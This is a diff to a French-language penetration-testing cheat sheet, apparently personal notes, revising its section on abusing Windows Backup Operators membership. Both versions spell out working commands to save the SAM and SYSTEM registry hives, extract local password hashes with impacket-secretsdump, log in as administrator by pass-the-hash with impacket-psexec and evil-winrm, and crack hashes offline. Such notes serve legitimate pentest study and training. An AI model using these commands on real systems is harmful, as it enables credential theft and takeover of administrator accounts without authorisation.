@@ -666,28 +666,35 @@ Choix rapide : GodPotato en premier, PrintSpoofer en fallback.
 
 ### Backup Operator
 
+Le groupe `Backup Operators` confère `SeBackupPrivilege` et `SeRestorePrivilege`, permettant de lire/écrire n'importe quel fichier en bypassant les ACLs - y compris les ruches de registre contenant les hashes locaux.
+
+**Vérifier la membership et les privilèges**
+
+```cmd
+whoami /groups
+whoami /priv
 ```
-net user <username>
 
-Local Group Memberships      *Backup Operators
-```
+**Sauvegarder les ruches SAM et SYSTEM**
 
-Si un utilisateur est dans le groupe `Backup Operators`, alors il peut 
-
-```bash
+```cmd
 mkdir C:\temp
 reg save HKLM\SAM C:\temp\SAM
 reg save HKLM\SYSTEM C:\temp\SYSTEM
+```
 
-# Télécharger les 2 fichiers sur sa Kali
-secretsdump.py -sam SAM -system SYSTEM LOCAL
+**Extraire les hashes**
+
+```bash
+# Transférer les fichiers sur Kali
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL
 ```
 
 **Pass-the-Hash** - s'authentifier sans connaître le mot de passe en clair :
 
 ```bash
-impacket-psexec -hashes :NTLMhash administrator@IP
-evil-winrm -i IP -u administrator -H NTLMhash
+impacket-psexec -hashes :NTLMhash administrator@<IP>
+evil-winrm -i <IP> -u administrator -H NTLMhash
 ```
 
 **Crack offline** avec hashcat :
